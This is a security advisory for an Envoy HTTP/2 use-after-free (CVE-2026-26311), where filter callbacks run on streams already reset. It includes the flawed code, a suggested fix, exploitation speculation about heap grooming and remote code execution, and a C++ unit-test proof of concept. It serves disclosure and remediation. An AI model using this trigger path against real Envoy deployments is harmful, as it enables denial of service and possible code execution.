# [M] Envoy: HTTP - filter chain execution on reset streams causing UAF crash

## Summary
Severity: Medium
Advisory: GHSA-84xm-r438-86px
CVE: CVE-2026-26311
CWE: CWE-416
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-84xm-r438-86px
Type: github-advisory

## Affected
- Go: `github.com/envoyproxy/envoy` — affected 1.37.0
- Go: `github.com/envoyproxy/envoy` — affected >=1.36.0
- Go: `github.com/envoyproxy/envoy` — affected >=1.35.0
- Go: `github.com/envoyproxy/envoy` — affected >=0

## Details
**Note:**
This vulnerability was originally reported to the Google OSS VRP (Issue ID: [477542544](https://issuetracker.google.com/issues/477542544)). The Google Security Team requested that I coordinate directly with the Envoy maintainers for triage and remediation. I am submitting this report here to facilitate that process.

**Technical Details**
I have identified a logic vulnerability in Envoy's HTTP connection manager (`FilterManager`) that allows for **Zombie Stream Filter Execution**. This issue creates a "Use-After-Free" (UAF) or state-corruption window where filter callbacks are invoked on an HTTP stream that has already been logically reset and cleaned up.

**Mechanism:**
The vulnerability resides in `source/common/http/filter_manager.cc` within the `FilterManager::decodeData` method.

When an HTTP/2 stream encounters a reset condition (e.g., `StreamIdleTimeout`, `OverloadManager` limits, or a local reset triggered by a filter), Envoy calls `onResetStream`. This method:
1.  Sets the internal state `state_.saw_downstream_reset_ = true`.
2.  Invokes `onDestroy()` on all filters in the chain (allowing them to release resources/pointers).
3.  Schedules the `ActiveStream` object for **deferred deletion** (cleanup happens later in the event loop).

**The Flaw:**
The `ActiveStream` object remains valid in memory during the deferred deletion window. If a `DATA` frame arrives on this stream immediately after the reset (e.g., in the same packet processing cycle), the HTTP/2 codec invokes `ActiveStream::decodeData`, which cascades to `FilterManager::decodeData`.

`FilterManager::decodeData` **fails to check the `saw_downstream_reset_` flag**. It iterates over the `decoder_filters_` list and invokes `decodeData()` on filters that have already received `onDestroy()`.

**Root Cause Code Location:**
File: `source/common/http/filter_manager.cc`
Function: `FilterManager::decodeData`

```cpp
void FilterManager::decodeData(...) {
  if (stopDecoderFilterChain()) { return; }

  // Vulnerability: Missing check for state_.saw_downstream_reset_
  // Execution proceeds into the loop even if the stream is logically dead.

  auto trailers_added_entry = decoder_filters_.end();
  for (; entry != decoder_filters_.end(); entry++) {
      // ... calls (*entry)->handle_->decodeData(data) on destroyed filters ...
  }
}
```

**Suggested Fix:**
Add an explicit state check at the beginning of `FilterManager::decodeData`.

```cpp
// Prevent execution on streams that have been reset but not yet destroyed.
if (state_.saw_downstream_reset_) {
  return;
}
```

---

## Impact Analysis

**Who can exploit this:**
Any remote attacker capable of establishing an HTTP/2 or HTTP/3 connection. No privileges/authentication required.

**Impact & Gain:**
**1. Memory Corruption & Potential Remote Code Execution:**
While the immediate symptom is a crash (DoS), the underlying primitive is a **Use-After-Free (CWE-416)**.
* **Mechanism:** When `onDestroy()` is called on filters (e.g., Lua, Wasm, or complex native filters), they release internal structures and invalidate pointers.
* **Exploitation:** By forcing `decodeData()` to execute on these now-freed objects, an attacker triggers undefined behavior. In a heap-groomed environment, an attacker could potentially replace the freed filter object with a malicious payload before the "Zombie" `decodeData` call occurs. This would allow for vtable hijacking or arbitrary write-what-where primitives, leading to **Remote Code Execution (RCE)**.
* **Risk Amplification:** This is particularly dangerous for Envoy deployments using memory-unsafe extensions or third-party filters (C++ extensions), where `onDestroy` logic is relied upon for safety.

**2. Security Control Bypass:**
The vulnerability defeats Envoy's "Fail-Closed" security architecture.
* **Scenario:** If a stream is reset due to a security violation (e.g., `StreamIdleTimeout`, `OverloadManager` rejection, or WAF triggering), this vulnerability allows the attacker to **bypass the termination**.
* **Result:** The attacker can force the processing of "Data" frames on a connection that the security policy explicitly attempted to close, allowing malicious payloads to reach deeper into the filter chain or backend services despite the rejection.

---

## Proof of Concept (Unit Test)

**Description:**
The attached C++ unit test (`zombie_stream_poc_test.cc`) deterministically reproduces the vulnerability. It creates a stream, manually triggers a reset (simulating an Overload), and then immediately injects a DATA frame. The test asserts that the filter's `decodeData` callback is invoked on the reset stream.

```cpp
#include "test/common/http/conn_manager_impl_test_base.h"
#include "gmock/gmock.h"
#include "gtest/gtest.h"

using testing::_;
using testing::Invoke;
using testing::NiceMock;
using testing::Return;

namespace Envoy {
namespace Http {

/**
 * Proof of Concept for "Zombie Stream Filter Execution" (HTTP/2 Reset Re-entrancy)
 * * Logic flow:
 * 1. Open a stream with HEADERS.
 * 2. Force a stream reset (simulating an Overload or Timeout).
 * 3. Immediately inject DATA into the stream.
 * 4. ASSERT that the filter's decodeData is called despite the stream being reset.
 */
class ZombieStreamPocTest : public HttpConnectionManagerImplTest {
};

TEST_F(ZombieStreamPocTest, ReproducedZombieFilterExecution) {
  setup(SetupOpts().setTracing(false));

  // 1. Setup a mock filter
  std::shared_ptr<MockStreamDecoderFilter> filter(new NiceMock<MockStreamDecoderFilter>());
   
  // Vuln confirmation:
  // We expect decodeData to be called on this filter even though the stream is reset.
  // In a secure/patched implementation, this EXPECT_CALL should fail (Times(0)).
  EXPECT_CALL(*filter, decodeData(_, _))
      .Times(1)
      .WillOnce(Invoke([&](Buffer::Instance&, bool) -> FilterDataStatus {
          ENVOY_LOG_MISC(error, "!!! VULNERABILITY REPRODUCED: decodeData called on a reset stream !!!");
          return FilterDataStatus::Continue;
      }));

  EXPECT_CALL(*filter, decodeHeaders(_, false))
      .WillOnce(Return(FilterHeadersStatus::StopIteration));

  // Register the filter
  EXPECT_CALL(filter_factory_, createFilterChain(_))
      .WillOnce(Invoke([&](FilterChainFactoryCallbacks& callbacks) -> bool {
        auto factory = createDecoderFilterFactoryCb(filter);
        callbacks.setFilterConfigName("vulnerable_filter");
        factory(callbacks);
        return true;
      }));

  // 2. Start the stream
  EXPECT_CALL(*codec_, dispatch(_))
      .WillOnce(Invoke([&](Buffer::Instance&) -> Http::Status {
        decoder_ = &conn_manager_->newStream(response_encoder_);
        RequestHeaderMapPtr headers{new TestRequestHeaderMapImpl{
            {":authority", "host"}, {":path", "/"}, {":method", "POST"}}};
        decoder_->decodeHeaders(std::move(headers), false);
        return Http::okStatus();
      }));

  // Dispatch headers
  Buffer::OwnedImpl header_buffer("headers");
  conn_manager_->onData(header_buffer, false);

  // 3. Trigger a Reset on the ActiveStream
  // This simulates Envoy terminating the stream due to an external event (Overload, Timeout).
  auto* active_stream = dynamic_cast<ConnectionManagerImpl::ActiveStream*>(decoder_);
  
  // This sets state_.saw_downstream_reset_ = true and triggers filter->onDestroy()
  active_stream->onResetStream(StreamResetReason::LocalReset, "simulated_overload");

  // 4. Attack: Send DATA to the "Zombie" stream
  // The ActiveStream object is still alive in the deferred delete list.
  Buffer::OwnedImpl malicious_payload("attacker_data");
   
  // This call reaches the filter because FilterManager::decodeData misses the check!
  active_stream->decodeData(malicious_payload, false);
}

} // namespace Http
} // namespace Envoy
```

## References
- https://github.com/envoyproxy/envoy/security/advisories/GHSA-84xm-r438-86px
- https://nvd.nist.gov/vuln/detail/CVE-2026-26311
- https://github.com/envoyproxy/envoy
